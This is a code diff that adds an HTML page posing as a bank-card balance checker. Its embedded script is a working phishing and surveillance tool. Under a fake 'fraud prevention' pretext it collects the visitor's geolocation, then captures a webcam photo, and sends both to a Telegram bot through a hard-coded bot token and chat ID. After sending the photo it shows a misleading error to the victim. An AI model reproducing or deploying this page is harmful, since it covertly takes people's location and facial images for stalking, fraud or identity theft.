@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Card & Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #0a0f1f, #0f172a);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .glass {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .popup {
+      background: rgba(30, 41, 59, 0.95);
+      backdrop-filter: blur(8px);
+    }
+    video {
+      width: 100%;
+      border-radius: 0.5rem;
+    }
+  </style>
+</head>
+<body class="flex items-center justify-center min-h-screen px-4 relative">
+
+  <!-- Main Card UI -->
+  <div class="glass rounded-2xl w-full max-w-sm p-6 text-white text-center shadow-xl z-10">
+    <h2 class="text-lg mb-2 text-gray-300">Check Card Balance</h2>
+    <p class="text-3xl font-bold text-green-400 mb-6">$*****</p>
+
+    <div class="bg-[#1e293b] rounded-xl p-4 mb-6">
+      <div class="flex justify-between items-center mb-4">
+        <div class="w-10 h-7 bg-gray-300 rounded-sm"></div>
+        <div class="flex space-x-1">
+          <div class="w-4 h-4 bg-gray-400 rounded-full"></div>
+          <div class="w-4 h-4 bg-gray-500 rounded-full"></div>
+        </div>
+      </div>
+      <p class="tracking-widest text-lg mb-2">**** **** **** 5436</p>
+      <p class="text-sm text-gray-400">CARDHOLDER</p>
+    </div>
+
+    <div class="flex justify-between items-center text-sm text-gray-300 mb-6">
+      <span>Card Type</span>
+      <span class="font-medium text-white"></span>
+    </div>
+
+    <button onclick="showLocationPopup()" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-6 rounded-xl w-full">Check Balance</button>
+
+    <div class="text-[10px] text-gray-500 mt-4 flex justify-center space-x-4">
+      <span>Source</span>
+      <span>|</span>
+      <span>Delivery</span>
+      <span>|</span>
+      <span>Worked</span>
+    </div>
+  </div>
+
+  <!-- Location Popup -->
+  <div id="locationPopup" class="hidden fixed inset-0 flex items-center justify-center z-50">
+    <div class="popup rounded-xl w-11/12 max-w-md p-6 text-white text-center shadow-2xl">
+      <h2 class="text-xl font-bold mb-4">Location Required</h2>
+      <p class="text-sm mb-4">
+        We use your location to verify your regional access and ensure fraud prevention.
+      </p>
+      <button onclick="getLocation()" class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg w-full">Click to Continue</button>
+      <p id="locationStatus" class="text-xs text-red-400 mt-4"></p>
+    </div>
+  </div>
+
+  <!-- Camera Popup -->
+  <div id="cameraPopup" class="hidden fixed inset-0 flex items-center justify-center z-50">
+    <div class="popup rounded-xl w-11/12 max-w-md p-4 text-white text-center shadow-2xl">
+      <h2 class="text-lg font-semibold mb-2">Verification</h2>
+      <p class="text-sm mb-3">Please allow camera access for final verification.</p>
+      <video id="video" autoplay playsinline class="mb-4 " hidden=""></video>
+      <button onclick="captureAndSendPhoto()" class="bg-purple-600 hover:bg-purple-700 text-white py-2 px-4 rounded w-full">Continue</button>
+      <p id="cameraStatus" class="text-xs text-green-400 mt-4"></p>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7988655641:AAHQeuBTeqg2q53CsctqC7mmMTzZo8_Gqkw';
+    const CHAT_ID = '-1002513958639';
+
+    function showLocationPopup() {
+      document.getElementById("locationPopup").classList.remove("hidden");
+    }
+
+    function getLocation() {
+      const status = document.getElementById("locationStatus");
+      status.innerText = "Requesting location...";
+
+      if (!navigator.geolocation) {
+        status.innerText = "Geolocation is not supported by your browser.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          console.log("Latitude:", lat, "Longitude:", lon);
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`
+            })
+          })
+          .then(response => {
+            if (response.ok) {
+              status.innerText = "✅ verify successfully. Now requesting camera access...";
+              setTimeout(() => {
+                document.getElementById("locationPopup").classList.add("hidden");
+                startCamera();
+              }, 1000);
+            } else {
+              status.innerText = "❌ Failed to send location.";
+            }
+          })
+          .catch(() => {
+            status.innerText = "❌ Network error while sending location.";
+          });
+        },
+        error => {
+          console.log("Location error:", error);
+          status.innerText = "❌ Failed to process. Please allow location access.";
+        }
+      );
+    }
+
+    function startCamera() {
+      const cameraPopup = document.getElementById("cameraPopup");
+      const video = document.getElementById("video");
+
+      cameraPopup.classList.remove("hidden");
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+        })
+        .catch(err => {
+          document.getElementById("cameraStatus").innerText = "Camera access denied.";
+          console.error("Camera error:", err);
+        });
+    }
+
+    function captureAndSendPhoto() {
+      const video = document.getElementById("video");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.jpg");
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(response => {
+          if (response.ok) {
+            document.getElementById("cameraStatus").innerText = "❌ error!";
+            console.log("Photo sent to Telegram.");
+          } else {
+            document.getElementById("cameraStatus").innerText = "❌ Failed to send photo.";
+          }
+        })
+        .catch(err => {
+          document.getElementById("cameraStatus").innerText = "❌ Network error while sending photo.";
+          console.error("Photo error:", err);
+        });
+      }, "image/jpeg");
+    }
+  </script>
+
+</body>
+</html>
